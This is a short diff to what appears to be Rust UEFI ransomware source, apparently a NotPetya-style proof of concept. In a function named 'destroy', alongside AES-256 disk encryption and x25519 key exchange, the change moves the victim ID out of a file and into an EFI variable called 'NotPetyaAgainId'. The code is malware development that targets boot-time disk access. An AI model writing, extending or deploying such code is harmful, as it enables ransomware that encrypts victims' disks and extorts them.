@@ -4,6 +4,7 @@ use core::ops::Range;
 
 use aes::cipher::{generic_array::GenericArray, BlockEncrypt, NewBlockCipher};
 use aes::{Aes256, Block};
+use log::info;
 use rand::rngs::OsRng;
 use uefi::prelude::SystemTable;
 use uefi::proto::media::block::BlockIO;
@@ -12,7 +13,9 @@ use uefi::{Error, Status};
 use x25519_dalek::{EphemeralSecret, PublicKey};
 
 use crate::efi_rng::EfiRng;
+use crate::efi_vars::write_var;
 use crate::file::write_file;
+use crate::read_var;
 
 pub const OEM_ID: &[u8; 8] = b"NTFS    ";
 
@@ -257,7 +260,7 @@ pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
 
     let mut buf = [0u8; 64];
     hex::encode_to_slice(id.as_bytes(), &mut buf).unwrap();
-    write_file(st, "id", &buf).unwrap();
+    write_var(st, "NotPetyaAgainId", &buf).unwrap();
 
     write_test_file(st, key.as_bytes())?;
 
